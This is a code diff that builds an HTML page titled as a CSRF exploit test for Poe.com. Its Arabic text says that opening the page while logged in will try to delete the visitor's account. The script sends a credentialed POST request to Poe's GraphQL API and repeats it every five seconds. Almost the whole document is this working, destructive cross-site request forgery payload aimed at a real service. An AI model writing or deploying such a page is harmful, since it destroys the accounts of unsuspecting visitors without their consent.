@@ -1,4 +1,15 @@
-function sendDeleteRequest() {
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PoE CSRF Exploit Test</title>
+</head>
+<body>
+  <h2>CSRF Exploit Test for PoE.com</h2>
+  <p>إذا أنت مسجل دخول في Poe.com، فتح هذا الصفحة سيحاول حذف حسابك تلقائياً.</p>
+
+  <script>
+    function sendDeleteRequest() {
   fetch("https://poe.com/api/gql_POST", {
     method: "POST",
     credentials: "include",
@@ -30,3 +41,7 @@ sendDeleteRequest();
 
 // ثم كرر كل 5 ثواني
 setInterval(sendDeleteRequest, 5000);
+
+  </script>
+</body>
+</html>
